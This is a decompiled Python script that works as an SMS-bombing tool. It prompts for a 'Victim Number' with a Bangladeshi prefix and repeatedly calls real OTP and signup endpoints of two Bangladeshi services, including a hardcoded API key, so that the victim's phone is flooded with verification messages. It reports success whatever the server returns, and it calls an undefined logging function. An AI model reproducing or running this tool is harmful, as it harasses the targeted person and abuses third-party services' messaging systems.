# coded by L0W - K3Y
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Mar 20 2021, 14:59:33) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: sumarr
import requests, os, time, sys, smtplib
blue = '\x1b[94m'
lightblue = '\x1b[94m'
red = '\x1b[91m'
white = '\x1b[97m'
green = '\x1b[93m'
green = '\x1b[1;32m'
cyan = '\x1b[96m'
end = '\x1b[0m'
yellow = '\n\n\x1b[1;93m'
os.system('clear')


print(green+"""________________$$$$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n ______________$$____$$\n __________$$$$$$____$$$$$$\n ________$$____$$____$$____$$$$\n ________$$____$$____$$____$$__$$\n $$$$$$__$$____$$____$$____$$____$$\n $$____$$$$________________$$____$$\n $$______$$______________________$$\n __$$____$$______________________$$\n ___$$$__$$______________________$$\n ____$$__________________________$$\n _____$$$________________________$$\n ______$$______________________$$$\n _______$$$____________________$$\n ________$$____________________$$\n _________$$$________________$$$\n __________$$________________$$\n __________$$$$$$$$$$$$$$$$$$$$""")
    


target = raw_input(cyan + ' [\xe2\x9c\x93] Enter your Victim Number              : +880')
amount = int(input(cyan + ' [\xe2\x9c\x93]Choose your Threads Amount (Unlimited) : '))
print ''
print ''
for i in range(amount):
    data = {'query': '\nmutation CreateOtp (\n    $phone: PhoneNumber!\n    $country: String!\n    $uuid: String!\n    $osVersionCode: String\n    $deviceBrand: String\n    $deviceModel: String\n    $requestFrom: String\n) {\n    createOtp(\n        auth: {\n            phone: $phone,\n            countryCode: $country,\n            deviceUuid: $uuid,\n            deviceToken: ""\n        }\n        device: {\n            deviceType: WEB\n            osVersionCode: $osVersionCode\n            deviceBrand: $deviceBrand\n            deviceModel: $deviceModel\n        }\n        requestFrom: $requestFrom\n    ){\n        statusCode\n    }\n}\n', 'variables': {'phone': target, 'country': '880', 'uuid': '64b9bb81-93f3-4757-9e92-9cfbf34d8039', 'osVersionCode': 'Linux armv8l', 'deviceBrand': 'Chrome', 'deviceModel': '89', 'requestFrom': 'U2FsdGVkX18QITR3WakOCR2OK+zoIpqM7DqxiLf915s='}}
    res = requests.post('https://api-v4-2.hungrynaki.com/graphql', json=data)
    if res.status_code == 200:
        logop(green + '        [\xe2\x9c\x93] Sms Sent Successfully')
    else:
        logop(green + '        [\xe2\x9c\x93] Sms Sent Successfully')
    data = {'requestType': 'send', 
       'phoneNumber': '+880' + target, 
       'emailConsent': 'true', 
       'whatsappConsent': 'true', 
       'email': 'cicas94417@iconmle.com'}
    header = {'x-api-key': 'dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3'}
    url = 'https://prod-api.viewlift.com/identity/signup?site=hoichoitv'
    res = requests.post(url, json=data, headers=header)
    if res.status_code == 200:
        logop(green + '        [\xe2\x9c\x93] Sms Sent Successfully')
    else:
        logop(green + '        [\xe2\x9c\x93] Sms Sent Successfully')

os.system('xdg-open https://www.facebook.com/l0wk3y.ofc/')
logop(yellow + '        \xe2\x9c\xaa Thanks For Using This Tool \xe2\x9c\xaa ')